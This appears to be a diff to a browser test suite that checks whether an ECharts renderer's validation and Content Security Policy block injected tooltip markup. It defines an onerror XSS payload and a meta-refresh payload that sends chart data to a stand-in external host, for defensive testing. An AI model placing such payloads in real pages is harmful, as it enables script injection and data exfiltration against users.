@@ -172,6 +172,7 @@ describe("ECharts", () => {
 
 describe("ECharts tooltip markup", () => {
   const PAYLOAD = `<img src=x onerror="window.__pwned=1">{b}`
+  const REFRESH = `<meta http-equiv="refresh" content="0;url=https://example.invalid/?d={b}">{b}`
   const BASE = { tooltip: { trigger: "item" }, legend: { data: ["2024"] }, xAxis: { type: "category", data: ["Q1", "Q2"] }, yAxis: { type: "value" }, series: [{ name: "2024", type: "bar", data: [120, 80] }] }
   type Option = { tooltip: Record<string, unknown>; legend: Record<string, unknown>; series: { tooltip?: unknown; data: unknown[] }[] }
   const LEVELS: [string, (o: Option) => void, "bar" | "legend"][] = [
@@ -185,8 +186,9 @@ describe("ECharts tooltip markup", () => {
     const r = el.getBoundingClientRect(); return { x: r.x + r.width / 2, y: r.y + r.height / 2 }
   }, target)
 
-  // The spec check refuses these (test/runtime.test.ts); here it is bypassed by editing the page's option JSON, which
-  // the CSP does not hash, so the policy is the only layer left. The markup reaches the tooltip and its handler is refused.
+  // Validation refuses these. Here both earlier layers are bypassed, to test the CSP alone: the option JSON is edited
+  // (the spec check), and the boot's own markup check is switched off with the page re-signed through the same policy
+  // function. The markup reaches the tooltip, and its handler is refused.
   for (const [level, inject, target] of LEVELS) test(`${level}: validation refuses the payload, and the CSP refuses its handler when the markup is forced into the page`, async () => {
     const authored = structuredClone(BASE) as unknown as Option
     inject(authored)
@@ -199,7 +201,9 @@ describe("ECharts tooltip markup", () => {
     const match = /<script type="application\/json" id="chart-spec">([\s\S]*?)<\/script>/.exec(text)!
     const option = JSON.parse(match[1]!) as Option
     inject(option)
-    writeFileSync(html, text.replace(match[1]!, JSON.stringify(option).replace(/</g, "\\u003c")))
+    const unchecked = text.replace(match[1]!, JSON.stringify(option).replace(/</g, "\\u003c")).replace("var refused=chartsTooltipMarkup(option);", "var refused=[];")
+    expect(unchecked).toContain("var refused=[];")
+    writeFileSync(html, resign(unchecked))
     const page = await open(html)
     expect(await page.status()).toBe("ready")
     const at = await hoverTarget(page.page, target)
@@ -210,6 +214,35 @@ describe("ECharts tooltip markup", () => {
     expect(page.violations.some(v => v.startsWith("script-src-attr"))).toBe(true)
     // The injected image's request is refused too (img-src allows data: and blob: only, and the harness aborts it).
     expect(page.violations.some(v => v.startsWith("img-src"))).toBe(true)
+    await page.close()
+  }, T)
+
+  // Markup a CSP cannot stop: a meta refresh navigates away with data. The page runs the spec check's own markup check
+  // (bundled, so covered by the CSP hash) before ECharts starts, so the forced payload never reaches the DOM.
+  for (const [level, inject] of [
+    ["/tooltip/formatter", (o: Option) => { o.tooltip.formatter = REFRESH }],
+    ["/series/0/data/0/tooltip/formatter", (o: Option) => { o.series[0]!.data[0] = { value: 120, tooltip: { formatter: REFRESH } } }],
+  ] as const) test(`${level}: a forced meta refresh is refused by the page itself, which keeps the static chart and never navigates`, async () => {
+    const { html } = await renderHtml(plugin, { spec: BASE, title: "Refresh", name: `refresh-${level.replace(/\W+/g, "-")}` })
+    const text = readFileSync(html, "utf8")
+    const match = /<script type="application\/json" id="chart-spec">([\s\S]*?)<\/script>/.exec(text)!
+    const option = JSON.parse(match[1]!) as Option
+    inject(option)
+    writeFileSync(html, text.replace(match[1]!, JSON.stringify(option).replace(/</g, "\\u003c")))
+    const page = await open(html)
+    const navigations: string[] = []
+    page.page.on("framenavigated", frame => navigations.push(frame.url()))
+    expect(await page.status()).toBe("failed")
+    const shell = await page.page.evaluate(() => ({ staticSvg: !!document.querySelector("#chart > svg"), live: document.querySelectorAll("#chart > div").length, meta: document.querySelectorAll("body meta").length, diagnostic: JSON.parse(document.getElementById("chart-diagnostic")!.textContent!), notice: !document.getElementById("chart-failure")!.hidden }))
+    expect(shell).toMatchObject({ staticSvg: true, live: 0, meta: 0, notice: true, diagnostic: { code: "HTML_RUNTIME_FAILED", engine: "echarts", stage: "init" } })
+    expect(shell.diagnostic.message).toContain(`Refused tooltip markup at ${level}`)
+    const at = await hoverTarget(page.page, "bar")
+    await page.page.mouse.move(at.x, at.y, { steps: 4 })
+    await page.page.waitForTimeout(1_200)
+    expect(navigations).toEqual([])
+    expect(page.page.url()).toBe(page.url)
+    expect(page.requests).toEqual([])
+    expect(page.violations).toEqual([])
     await page.close()
   }, T)
 
